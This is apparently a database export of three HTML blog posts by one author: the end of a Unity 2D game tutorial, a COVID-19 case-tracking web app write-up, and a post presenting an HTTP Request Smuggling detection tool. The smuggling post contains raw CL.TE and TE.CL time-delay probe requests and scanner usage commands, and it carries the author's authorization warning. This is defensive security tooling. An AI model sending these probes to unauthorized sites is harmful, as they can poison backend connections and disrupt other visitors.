is our attack vector, so when the character uses his sword to attack the enemy then we need to know the range and the point of the attack so that we can successfully launch our attack.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">To calculate the attack range and point Unity has an API called <a href='"https://docs.unity3d.com/ScriptReference/Physics2D.OverlapCircleAll.html'"><font color='"#dd4124'"><b>Physics2D.OverlapCircleAll</b></font></a> it will return a list of colliders which falls with the circular area and when we get all the colliders then all we need to do is start a loop and within the loop destroy the enemy game object.&nbsp;</font><span style='"font-size: large;'">And to give more clarity to our attack I have created a blood </span><a href='"https://docs.unity3d.com/ScriptReference/ParticleSystem.html'" style='"font-size: large;'"><font color='"#dd4124'"><b>particle system</b></font></a><span style='"font-size: large;'"> which will appear on every enemy death.</span></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><b style='"'"><font size='"5'">Score Counter</font></b></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">If you understood the above two techniques (Character Death &amp; Character Attack) then to implement the scoring functionality it''s quite easy as we need to follow a similar approach. When the character and the gold coins collide with each other then I am calculating the score to +10 through the script and again here also I am using <a href='"https://docs.unity3d.com/ScriptReference/MonoBehaviour.OnTriggerEnter2D.html'"><font color='"#dd4124'"><b>OnTriggerEnter2D(Collider2D trigger)</b></font></a> API.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">To display the score on the game I have used <a href='"https://docs.unity3d.com/2018.3/Documentation/ScriptReference/UI.Text.html'"><font color='"#dd4124'"><b>Text UI</b></font></a> component which comes under <a href='"https://docs.unity3d.com/Packages/com.unity.ugui@1.0/api/UnityEngine.UI.html'"><font color='"#dd4124'"><b>UnityEngine.UI</b></font></a>.&nbsp;</font><span style='"font-size: large;'">And the same scoring variable is being used in all three components (You Win, Game Over &amp; Time''s Up).</span></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><b style='"'"><font size='"5'">Timer</font></b></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">To implement the timer functionality Unity has an API called <a href='"https://docs.unity3d.com/ScriptReference/MonoBehaviour.StartCoroutine.html'"><font color='"#dd4124'"><b>StartCoroutine</b></font></a> which is used to create a parallel action and can pause the current execution and then continue where it left off and all the coroutine function is declared with a return type of IEnumerator with the yield return statement.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">In this game, I have set the timer to 3 minutes and when the game starts immediately it will start the coroutine function and calculates the timer and when the timer reaches zero it will call <a href='"https://docs.unity3d.com/ScriptReference/MonoBehaviour.StopCoroutine.html'"><font color='"#dd4124'"><b>StopCoroutine</b></font></a> function.&nbsp;</font><span style='"font-size: large;'">And again I have used Text UI component to display the time on the game.</span></div><div style='"'"><br></div><div style='"'"><b style='"'"><font size='"5'">How to publish for WebGL?</font></b></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">Unity has WebGL build option which allows publishing content as JavaScript&nbsp;programs and internally it uses HTML5/JavaScript, WebAssembly, WebGL rendering.&nbsp;</font><span style='"font-size: large;'">In today''s modern web browsers by default enables WebGL and it''s quite helpful to run Unity WebGL application on the browsers.&nbsp;</span><span style='"font-size: large;'">To run a WebGL application we need to run through a local server and in this game, I have Node.js as my server but you can also use any other scripting languages.</span></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><b style='"'"><font size='"5'">Open Source</font></b></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">I have made the complete development open-source on my <a href='"https://github.com/anshumanpattnaik/unity-2d-forest-assassin-game'"><font color='"#dd4124'"><b>GitHub</b></font></a>&nbsp;so that you will have a clear understanding of every component of this game and also I hope it will give you an idea to build your own game.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">So this is the overall explanation of Forest Assassin game, I hope you understood the tools and techniques behind this game if you find any issues then please feel free to raise an issue on <a href='"https://github.com/anshumanpattnaik/unity-2d-forest-assassin-game'"><font color='"#dd4124'"><b>GitHub</b></font></a>.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">Enjoy the game and also share this game with your friends.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">Thank you &amp; Happy coding :)</font></div></div></div>",t,f,"",f
21,HTTP Request Smuggling Detection Tool,http-request-smuggling-detection-tool,Anshuman Pattnaik,2020-12-21 01:28:00.593382+05:30,2021-06-05 19:48:01.733134+05:30,https://assets.hackbotone.com/assets/http-request-smuggling-detection-tool/seo_thumbnail.png,https://assets.hackbotone.com/assets/http-request-smuggling-detection-tool/small_thumbnail.png,https://assets.hackbotone.com/assets/http-request-smuggling-detection-tool/large_thumbnail.png,"{Smuggling,'"Ethical Hacking'",Python,http-desync-attack}",HTTP Request Smuggling is very critical and high severity vulnerability and was initially discovered by watchfire back in 2005 and later it got re-discovered by James Kettle - (albinowax) in August 2019 and presented his research at DEF CON 27 &amp; Black-HAT USA. HRS vulnerability allows an attacker to smuggle an ambiguous HTTP-request as second request in one single HTTP-request to bypass the security controls of a website and gain access to unauthorized sensitive data and performs malicious activities. To know more about this vulnerability I'll highly suggest referring James Kettle well-documented research blogs at Portswigger website.,"<div><b><font size='"5'">What is HTTP Request Smuggling?</font></b></div><div><br></div><div><font size='"4'">HTTP Request Smuggling is very critical and high severity vulnerability and was initially discovered by <a href='"https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf'"><font color='"#dd4124'">watchfire</font></a> back in 2005 and later it got re-discovered by <a href='"https://twitter.com/albinowax'"><font color='"#dd4124'">James Kettle - (albinowax)</font></a> in August 2019 and presented his research at <a href='"https://www.youtube.com/watch?v=w-eJM2Pc0KI'"><font color='"#dd4124'">DEF CON 27</font></a> &amp; <a href='"https://www.youtube.com/watch?v=_A04msdplXs'"><font color='"#dd4124'">Black-HAT USA</font></a>. HRS vulnerability allows an attacker to smuggle an ambiguous HTTP-request as second request in one single HTTP-request to bypass the security controls of a website and gain access to unauthorized sensitive data and performs malicious activities. To know more about this vulnerability I''ll highly suggest referring James Kettle well-documented research blogs at PortSwigger website.</font></div><div><font size='"4'"><br></font></div><div><div style='"font-size: large;'"><ul><li><a href='"https://portswigger.net/web-security/request-smuggling'"><font color='"#dd4124'">https://portswigger.net/web-security/request-smuggling</font></a></li><li><a href='"https://portswigger.net/web-security/request-smuggling/finding'"><font color='"#dd4124'">https://portswigger.net/web-security/request-smuggling/finding</font></a></li><li><font color='"#dd4124'"><a href='"https://portswigger.net/web-security/request-smuggling/exploiting'" style='"'"><font color='"#dd4124'" style='"'">https://portswigger.net/web-security/request-smuggling/exploiting</font></a></font></li></ul><div><br></div></div><div style='"font-size: large;'"><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/ANIRMVwyz5o'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div style='"font-size: large;'"><br></div><div style='"'"><div style='"'"><b style='"'"><font size='"5'">How to detect HRS vulnerability?</font></b></div><div style='"font-size: large;'"><br></div><div style='"'"><font size='"4'">Based on the earlier research the most common way to detect the HRS vulnerability is to check the application''s response time, if the vulnerability exists then there will be a time delay in response. So there are two different ways to detect this vulnerability.</font></div><div style='"font-size: large;'"><ul><li>CL.TE</li><li>TE.CL</li></ul></div><div style='"font-size: large;'"><br></div><div style='"'"><b style='"'"><font size='"5'">Detect (CL.TE) using time delay</font></b></div><div style='"font-size: large;'"><br></div><div style='"'"><font size='"4'">To detect (CL.TE) vulnerability in an application you need to smuggle a request like below which causes a delay in response.</font></div><div style='"'"><br></div></div></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token constant'">POST</span> <span class='"token operator'">/</span> <span class='"token constant'">HTTP</span><span class='"token operator'">/</span><span class='"token number'">1.1
</span>Host<span class='"token operator'">:</span> vulnerable<span class='"token operator'">-</span>website<span class='"token punctuation'">.</span><span class='"token property-access'">com
</span>Content<span class='"token operator'">-</span><span class='"token maybe-class-name'">Length</span><span class='"token operator'">:</span> <span class='"token number'">5
</span>Transfer<span class='"token operator'">-</span><span class='"token maybe-class-name'">Encoding</span><span class='"token operator'">:</span>chunked

1
Z
Q</code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><div><font size='"4'">In the above HTTP request the front-end server uses Content-Length header which has a length of 5 which means it will only process the request body up to Z and it won''t include Q in the first request and the back-end server uses Transfer-Encoding header which will process the first chunks of request and waits for the next chunks to arrive which causes a delay in response because as per the front-end server''s content-length it processed only request body of length 5.</font></div><div><br></div><div><b><font size='"5'">Detect (TE.CL) using time delay</font></b></div><div><br></div><div><font size='"4'">To detect (TE.CL) vulnerability in an application you need to smuggle a request like below which causes a delay in response.</font></div></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token constant'">POST</span> <span class='"token operator'">/</span> <span class='"token constant'">HTTP</span><span class='"token operator'">/</span><span class='"token number'">1.1
</span>Host<span class='"token operator'">:</span> vulnerable<span class='"token operator'">-</span>website<span class='"token punctuation'">.</span><span class='"token property-access'">com
</span>Content<span class='"token operator'">-</span><span class='"token maybe-class-name'">Length</span><span class='"token operator'">:</span> <span class='"token number'">6
</span>Transfer<span class='"token operator'">-</span><span class='"token maybe-class-name'">Encoding</span><span class='"token operator'">:</span>chunked

0

G</code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><div><font size='"4'">In the above HTTP request, the front-end server uses Transfer-Encoding header and in the request body, it sends 0 followed by which means in the first request it will terminate the request up to 0 and forwards the request and left remaining contents of the request body and the back-end server uses Content-Length header which has a length of 6 which waits for more contents to arrive which causes a delay in response.</font></div><div><br></div><div><b><font size='"5'">HRS Detection Tool</font></b></div><div><br></div><div><font size='"4'">By following the portswigger research academy I have developed a detection tool using python and by using the tool we can identify whether the application is vulnerable to (CL.TE) or (TE.CL) and to detect the vulnerability more accurately the tool has built-in payloads which has around <a href='"https://github.com/anshumanpattnaik/http-request-smuggling/blob/main/payloads.json'"><font color='"#dd4124'">37 permutes</font></a> and detection payloads for both (CL.TE) and (TE.CL) variants, the tool supports to scan one single URL or multiple URLs. And most importantly it has (--retry) option which means you can retry the same payload based on the retry value, which gives us an option to detect this vulnerability more accurately.</font></div><div><br></div><div><b><font size='"5'">Needs to follow Security Consent before using this tool</font></b></div><div><br></div><div><font size='"4'">It''s quite important to know some of the legal disclaimers before scanning any of the targets, you should have proper authorization before scanning any of the targets otherwise I suggest do not use this tool to scan an unauthorized target because to detect the vulnerability it sends multiple payloads for multiple times by using (--retry) option which means if something goes wrong then there is a possibility that backend socket might get poisoned with the payloads and any genuine visitors of that particular website might end up seeing the poisoned payload rather seeing the actual content of the website. So I''ll highly suggest taking proper precautions before scanning any of the target website otherwise you will face some legal issue.</font></div><div><br></div><div><b><font size='"5'">How to use this tool?</font></b></div><div><br></div><div><font size='"4'">To install this tool in your local machine you must have at least Python version 3.x otherwise socket will fail to established SSL connection with the target host.</font></div><div><br></div><div><b><font size='"5'">Installation</font></b></div></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">git clone https<span class='"token operator'">:</span><span class='"token operator'">/</span><span class='"token operator'">/</span>github<span class='"token punctuation'">.</span><span class='"token property-access'">com</span><span class='"token operator'">/</span>anshumanpattnaik<span class='"token operator'">/</span>http<span class='"token operator'">-</span>request<span class='"token operator'">-</span>smuggling<span class='"token punctuation'">.</span><span class='"token property-access'">git
</span>cd http<span class='"token operator'">-</span>request<span class='"token operator'">-</span>smuggling
pip3 install <span class='"token operator'">-</span>r requirements<span class='"token punctuation'">.</span><span class='"token property-access'">txt</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><b><font size='"5'">Options</font></b><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">usage<span class='"token operator'">:</span> smuggle<span class='"token punctuation'">.</span><span class='"token property-access'">py</span> <span class='"token punctuation'">[</span><span class='"token operator'">-</span>h<span class='"token punctuation'">]</span> <span class='"token punctuation'">[</span><span class='"token operator'">-</span>u <span class='"token constant'">URL</span><span class='"token punctuation'">]</span> <span class='"token punctuation'">[</span><span class='"token operator'">-</span>urls <span class='"token constant'">URLS</span><span class='"token punctuation'">]</span> <span class='"token punctuation'">[</span><span class='"token operator'">-</span>t <span class='"token constant'">TIMEOUT</span><span class='"token punctuation'">]</span> <span class='"token punctuation'">[</span><span class='"token operator'">-</span>m <span class='"token constant'">METHOD</span><span class='"token punctuation'">]
</span><span class='"token punctuation'">[</span><span class='"token operator'">-</span>r <span class='"token constant'">RETRY</span><span class='"token punctuation'">]
</span>
HTTP <span class='"token maybe-class-name'">Request</span> <span class='"token maybe-class-name'">Smuggling</span> vulnerability detection tool

optional arguments<span class='"token operator'">:
</span><span class='"token operator'">-</span>h<span class='"token punctuation'">,</span> <span class='"token operator'">--</span>help show <span class='"token keyword'">this</span> help message and exit
<span class='"token operator'">-</span>u <span class='"token constant'">URL</span><span class='"token punctuation'">,</span> <span class='"token operator'">--</span>url <span class='"token constant'">URL</span> <span class='"token keyword'">set</span> the target url
<span class='"token operator'">-</span>urls <span class='"token constant'">URLS</span><span class='"token punctuation'">,</span> <span class='"token operator'">--</span>urls <span class='"token constant'">URLS</span> <span class='"token keyword'">set</span> list <span class='"token keyword'">of</span> target urls<span class='"token punctuation'">,</span> i<span class='"token punctuation'">.</span><span class='"token method function property-access'">e</span> <span class='"token punctuation'">(</span>urls<span class='"token punctuation'">.</span><span class='"token property-access'">txt</span><span class='"token punctuation'">)
</span><span class='"token operator'">-</span>t <span class='"token constant'">TIMEOUT</span><span class='"token punctuation'">,</span> <span class='"token operator'">--</span>timeout <span class='"token constant'">TIMEOUT</span> <span class='"token keyword'">set</span> socket timeout<span class='"token punctuation'">,</span> <span class='"token keyword module'">default</span> <span class='"token operator'">-</span> <span class='"token number'">10
</span><span class='"token operator'">-</span>m <span class='"token constant'">METHOD</span><span class='"token punctuation'">,</span> <span class='"token operator'">--</span>method <span class='"token constant'">METHOD</span> <span class='"token keyword'">set</span> <span class='"token constant'">HTTP</span> <span class='"token maybe-class-name'">Methods</span><span class='"token punctuation'">,</span> i<span class='"token punctuation'">.</span><span class='"token method function property-access'">e</span> <span class='"token punctuation'">(</span><span class='"token constant'">GET</span> or <span class='"token constant'">POST</span><span class='"token punctuation'">)</span><span class='"token punctuation'">,</span> <span class='"token keyword module'">default</span> <span class='"token operator'">-</span> <span class='"token constant'">POST
</span><span class='"token operator'">-</span>r <span class='"token constant'">RETRY</span><span class='"token punctuation'">,</span> <span class='"token operator'">--</span>retry <span class='"token constant'">RETRY</span> <span class='"token keyword'">set</span> the retry count to re<span class='"token operator'">-</span>execute the payload<span class='"token punctuation'">,</span> <span class='"token keyword module'">default</span> <span class='"token operator'">-</span> <span class='"token number'">2</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><div><b><font size='"5'">Example usage for using this tool</font></b></div><div><br></div><div><b><font size='"4'">Scan one single&nbsp;</font></b><font size='"4'"><b>URL</b></font></div></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">python3 smuggle<span class='"token punctuation'">.</span><span class='"token property-access'">py</span> <span class='"token operator'">-</span>u <span class='"token punctuation'">[</span><span class='"token constant'">URL</span><span class='"token punctuation'">]</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><b><font size='"4'">Scan list of&nbsp;</font></b><font size='"4'"><b>URLs</b></font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">python3 smuggle<span class='"token punctuation'">.</span><span class='"token property-access'">py</span> <span class='"token operator'">-</span>urls <span class='"token punctuation'">[</span><span class='"token maybe-class-name'">URLs</span><span class='"token punctuation'">.</span><span class='"token property-access'">txt</span><span class='"token punctuation'">]</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><div><font size='"4'">The detection payloads for both (CL.TE) and (TE.CL) are quite general and if you feel it requires to modify then you can update the payload in <a href='"https://github.com/anshumanpattnaik/http-request-smuggling/blob/main/payloads.json#L300'"><font color='"#dd4124'">payloads.json</font></a> file of detection array.&nbsp;</font><span style='"font-size: large;'">Time-based HRS detection logic is not always accurate and to confirm the vulnerability I can suggest you to play with <a href='"https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988'"><font color='"#dd4124'">burp-suite turbo intruder</font></a> by using your payloads.</span></div><div><font size='"4'"><br></font></div><div><font size='"4'">I hope you will find it useful my HRS Detection tool if you have any suggestion or find any issues then feel free to raise an issue in my <a href='"https://github.com/anshumanpattnaik/http-request-smuggling/'"><font color='"#dd4124'">GitHub&nbsp;repository</font></a>.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">Thank you for reading this post and Happy Hacking :)</font></div></div>",t,t,"<div><font face='"Lora, serif'" size='"4'">The project work was highly appreciated by many <a href='"https://en.wikipedia.org/wiki/Information_security'"><font color='"#dd4124'">InfoSec</font></a> communities and featured in their platforms by highlighting the tool implementation to detect CL.TE/TE.CL vulnerability.</font></div><div><font face='"Lora, serif'" size='"4'"><br></font></div><div><font face='"Lora, serif'" size='"4'"><b style='"'">Top Mentions</b></font></div><div><ul><li><font face='"Lora, serif'" size='"4'"><a href='"https://twitter.com/nil0x42/status/1340951508297379843'"><font color='"#dd4124'">Automatically detect HTTP Request Smuggling vulnerabilities on target</font></a> - by <a href='"https://twitter.com/nil0x42/'"><font color='"#dd4124'">@nil0x42</font></a></font></li><li><font size='"4'"><a href='"https://twitter.com/ptracesecurity/status/1363028873068355586'"><font color='"#dd4124'">HTTP Request Smuggling Detection Tool</font></a> - by <a href='"https://twitter.com/ptracesecurity/'"><font color='"#dd4124'">@ptracesecurity</font></a></font></li><li><font size='"4'" color='"#dd4124'"><a href='"https://pythonrepo.com/repo/anshumanpattnaik-http-request-smuggling'"><font color='"#dd4124'">PythonRepo | HTTP Request Smuggling Detection Tool</font></a></font></li><li><font size='"4'" color='"#dd4124'"><a href='"https://book.hacktricks.xyz/pentesting-web/http-request-smuggling#tools'"><font color='"#dd4124'">HackTricks | HTTP Request Smuggling / HTTP Desync Attack</font></a></font></li></ul></div><div><br></div>",t
18,Coronavirus (COVID-19) - Full Stack Application,covid-19-full-stack-application,Anshuman Pattnaik,2020-04-13 01:27:07.063617+05:30,2021-06-05 19:47:42.879113+05:30,https://assets.hackbotone.com/assets/covid19-full-stack-application/seo_thumbnail.png,https://assets.hackbotone.com/assets/covid19-full-stack-application/small_thumbnail.png,https://assets.hackbotone.com/assets/covid19-full-stack-application/large_thumbnail.png,"{'"Application Development'",react.js,node.js,mongodb}","Coronavirus (COVID-19) which is an infectious disease caused by respiratory illness and symptoms like flu, cough, fever, difficulty breathing, on December 31, 2019, the first case was recorded in Wuhan, China and later the virus got spread around the world and as of now, around 1 million+ confirmed cases are being recorded since then.","<font size='"5'" style='"'"><b>What is Coronavirus (COVID-19)?</b></font><div><font size='"5'"><br></font></div><div><div><font size='"4'">Coronavirus (COVID-19) which is an infectious disease caused by respiratory illness and symptoms like flu, cough, fever, difficulty breathing, on December 31, 2019, the first case was recorded in Wuhan, China and later the virus got spread around the world and as of now, around 1 million+ confirmed cases are being recorded since then.</font></div><div><span style='"font-size: large;'"><br></span></div><div><span style='"font-size: large;'">You can protect yourself from this virus by following basic precautions like washing your hand frequently, avoid touching your face, maintaining a distance of (1 meter or 3 feet) between people and most importantly if you are sick then immediately call for medical help at your nearest hospital.</span><br></div></div><div><br></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/dth5jfLDuus'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><font size='"5'"><b>How to build a full-stack application with interactive maps?</b></font><br></div><div><font size='"5'"><br></font></div><div><div><font size='"4'">In the current scenario, it''s quite important to track the statistics of all the cases around the world constantly and thanks to <a href='"https://github.com/CSSEGISandData/COVID-19'"><font color='"#dd4124'">Johns Hopkins University Center for Systems Science and Engineering (JHU CSSE)</font></a> for providing the data to the public user, the data are quite well organized and sorted in very well manner and they are updating their repository every day.</font></div><div><span style='"font-size: large;'"><br></span></div><div><span style='"font-size: large;'">So as I have collected the data now I have decided to build a <a href='"https://covid19.hackbotone.com/'"><font color='"#dd4124'">full-stack application</font></a> with interactive maps so that it will be quite easier for the user to track the cases across the globe.</span><br></div></div><div><span style='"font-size: large;'"><br></span></div><div><font size='"5'"><b>Node.js Backend Services</b></font><br></div><div><font size='"5'"><br></font></div><div><div><font size='"4'"><a href='"https://github.com/CSSEGISandData/COVID-19'"><font color='"#dd4124'">JHU CSSE</font></a> maintains the data in CSV format in their repository and I need to convert the CSV data to JSON format so that it will be quite easier for the front-end framework to populate the data in an efficient way. So to convert CSV to JSON I have use <a href='"https://www.npmjs.com/package/csv-parser'"><font color='"#dd4124'">csv-parser</font></a> npm module which is a very popular CSV parser and converts CSV into JSON at a rate of around 90,000 rows per second.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">And after parsing the data I have stored the data into MongoDB so that it won''t parse the data every time, it will only parse the data when new data will be available.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">JHU CSSE updates the data once a day around 23:59 (UTC) and to synchronize the data in my server I am using <a href='"https://www.npmjs.com/package/node-cron'"><font color='"#dd4124'">node-cron</font></a> npm modules which is a task scheduler and once you register a task with the given time then it will run in the background and triggers when it reaches to the scheduled time.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">And in my case, the scheduled time is 23 hours 59 minutes and when it reaches the time then it will update the data into my server.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">Now after parsing the data next big challenge is to populate all the coordinates on the map because on the map if I traditionally populate the coordinates then the application will be much slower, so the solution to this problem is <a href='"https://geojson.org/'"><font color='"#dd4124'">GeoJSON</font></a> which is an open standard format for representing geographical features as a point, line strings, polygons and etc and this format is based on JavaScript&nbsp;Object Notation and most importantly all the maps platform such as <a href='"https://developers.google.com/maps/documentation'"><font color='"#dd4124'">GoogleMap</font></a>, <a href='"https://www.mapbox.com/'"><font color='"#dd4124'">Mapbox</font></a> and many others supports GeoJSON format.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">So I have design one endpoint as <a href='"https://covid19-api.hackbotone.com/markers.geojson'" style='"'"><font color='"#dd4124'">/markers.geojson</font></a> which takes the input from the <a href='"https://www.mongodb.com/'" style='"'"><font color='"#dd4124'">MongoDB</font></a> and prepares all the coordinates into GeoJSON format, so the front-end framework can call this end-point while doing the map implementation.</font></div></div><div><font size='"5'"><br></font></div><div><font size='"5'" style='"'"><b>React.js Frontend Services</b><br></font></div><div><font size='"5'" style='"'"><br></font></div><div><div><font size='"4'">I have chosen <a href='"https://reactjs.org/'"><font color='"#dd4124'">react.js</font></a> as my front-end framework for this application and to maintain the application state I have also implemented <a href='"https://redux.js.org/'"><font color='"#dd4124'">redux</font></a> which is a very popular JavaScript&nbsp;library for managing application state and both of these frameworks are quite efficient and easy to implement.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">To populate the coordinates on the map I&nbsp;have implemented Mapbox which is quite similar to GoogleMap but the major advantage of <a href='"https://www.mapbox.com/'"><font color='"#dd4124'">Mapbox</font></a> is it''s free and provides many better functionalities such as Custom maps, Clustering and etc.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">As I have already mentioned that Mapbox also supports GeoJSON format so to populate GeoJSON data over the map, Mapbox has a technique called <a href='"https://docs.mapbox.com/help/glossary/source-layer/'"><font color='"#dd4124'">Source-Layer</font></a> which is an individual layer of data within a vector source and <a href='"https://docs.mapbox.com/mapbox-gl-js/style-spec/sources/'"><font color='"#dd4124'">Sources</font></a> defines which type of data map should display and in this application data type is ''geojson'' and after defining the data <a href='"https://docs.mapbox.com/mapbox-gl-js/style-spec/layers/'"><font color='"#dd4124'">Layers</font></a> refers to the source for visual representation and styling of the map. And in this way, I have populated all the coordinates on the map.</font></div></div><div><font size='"5'" style='"'"><br></font></div><div><font size='"5'" style='"'"><b>Open Source</b><br></font></div><div><font size='"5'" style='"'"><br></font></div><div><div><font size='"4'">It will be quite difficult for me to walk you through step-by-step every lines of codes. That''s why I made the complete development open-source on my GitHub. So that you can also build similar types of application by following this repository.</font></div><div><font size='"4'"><br></font></div><div><ul><li><font size='"4'">Github Link:- <a href='"https://github.com/anshumanpattnaik/covid19-full-stack-application'"><font color='"#dd4124'">covid19-full-stack-application</font></a></font></li><li><span style='"font-size: large;'">Website Link:- <a href='"https://covid19.hackbotone.com/'"><font color='"#dd4124'">https://covid19.hackbotone.com/</font></a></span></li></ul></div><div><font size='"4'"><br></font></div><div><font size='"4'">So this is the overall explanation of this website, I hope you guys understood the tools and techniques behind this application if you find any types of issues like on improving codes then please feel free raise an issue on GitHub&nbsp;or else you can reach out to me on <a href='"https://twitter.com/anspattnaik'"><font color='"#dd4124'">twitter</font></a> I''ll be happy to answer your questions.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">Please stay safe and stay well, I want to mention it again to protect yourself from this virus wear mask, wash your hand frequently and take necessary precautions if you get sick.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">Thank you &amp; Happy coding :)</font></div></div>",t,t,"<div><font face='"Lora, serif'" size='"4'">The project work was highly appreciated by developer communities and got more than <a href='"https://github.com/anshumanpattnaik/covid19-full-stack-application/stargazers'"><font color='"#dd4124'">250+ GitHub stars</font></a> and also once featured on the JavaScript Trending board.</font></div><div><font face='"Lora, serif'" size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/github_achievement/Github%20Trending.PNG'"><font face='"Lora, serif'" size='"4'"><br></font></div><div><font face='"Lora, serif'" size='"4'"><br></font></div><div><font face='"Lora, serif'" size='"4'">I would like to thank everyone for appreciating my work.</font></div>",t
